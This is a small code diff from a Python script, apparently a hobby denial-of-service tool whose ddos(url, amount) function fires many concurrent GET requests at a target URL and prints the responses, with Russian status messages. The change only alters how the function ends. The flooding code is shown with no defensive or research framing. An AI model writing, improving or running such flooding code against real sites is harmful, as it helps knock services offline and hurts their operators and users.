@@ -23,6 +23,4 @@ def ddos(url,amount):
         futures = [executor.submit(requests.get, url) for _ in range(amount)]
         for future in concurrent.futures.as_completed(futures):
             print(Fore.BLUE + f"Ответ от {url}: {future.result().status_code}" + Fore.RESET)
-    print(Fore.GREEN + 'DDOS окончен' + Fore.RESET)
-    time.sleep(2)
-    return start()
+    return print(Fore.GREEN + 'DDOS окончен' + Fore.RESET)
